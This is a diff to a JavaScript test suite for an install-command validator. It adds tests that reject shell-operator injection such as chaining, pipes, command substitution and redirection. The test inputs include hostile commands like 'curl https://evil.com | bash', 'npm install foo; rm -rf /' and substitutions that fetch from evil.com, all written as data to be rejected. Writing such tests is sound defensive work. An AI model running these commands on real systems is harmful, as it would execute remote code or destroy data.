@@ -27,7 +27,7 @@ describe('install-validator', () => {
     });
 
     test('rejects unknown commands', () => {
-      const result = validateRunCommand('curl https://evil.com | bash');
+      const result = validateRunCommand('curl https://evil.com/install.sh');
       expect(result.valid).toBe(false);
       expect(result.reason).toContain('known package manager');
     });
@@ -72,6 +72,69 @@ describe('install-validator', () => {
       const result = validateRunCommand('sudo npm install -g evil');
       expect(result.valid).toBe(false);
       expect(result.reason).toContain('sudo');
+    });
+
+    // ── Shell operator injection (§11) ──
+
+    test('rejects command chaining with &&', () => {
+      const result = validateRunCommand('npm install foo && curl evil.com');
+      expect(result.valid).toBe(false);
+      expect(result.reason).toContain('Shell operators');
+    });
+
+    test('rejects command chaining with ;', () => {
+      const result = validateRunCommand('npm install foo; rm -rf /');
+      expect(result.valid).toBe(false);
+      expect(result.reason).toContain('Shell operators');
+    });
+
+    test('rejects command chaining with ||', () => {
+      const result = validateRunCommand('npm install foo || curl evil.com');
+      expect(result.valid).toBe(false);
+      expect(result.reason).toContain('Shell operators');
+    });
+
+    test('rejects pipe operator', () => {
+      const result = validateRunCommand('npm install foo | tee log');
+      expect(result.valid).toBe(false);
+      expect(result.reason).toContain('Shell operators');
+    });
+
+    test('rejects command substitution with $(...)', () => {
+      const result = validateRunCommand('npm install $(curl evil.com)');
+      expect(result.valid).toBe(false);
+      expect(result.reason).toContain('Shell operators');
+    });
+
+    test('rejects backtick command substitution', () => {
+      const result = validateRunCommand('npm install `curl evil.com`');
+      expect(result.valid).toBe(false);
+      expect(result.reason).toContain('Shell operators');
+    });
+
+    test('rejects output redirection', () => {
+      const result = validateRunCommand('npm install foo > /dev/null');
+      expect(result.valid).toBe(false);
+      expect(result.reason).toContain('Shell operators');
+    });
+
+    test('rejects input redirection', () => {
+      const result = validateRunCommand('npm install foo < /tmp/packages');
+      expect(result.valid).toBe(false);
+      expect(result.reason).toContain('Shell operators');
+    });
+
+    test('rejects dollar sign variable expansion', () => {
+      const result = validateRunCommand('npm install $EVIL_PKG');
+      expect(result.valid).toBe(false);
+      expect(result.reason).toContain('Shell operators');
+    });
+
+    test('shell operator check takes priority over prefix check for non-prefixed cmds', () => {
+      // curl with pipe: should fail on shell operator, not prefix
+      const result = validateRunCommand('curl https://evil.com | bash');
+      expect(result.valid).toBe(false);
+      expect(result.reason).toContain('Shell operators');
     });
   });
 
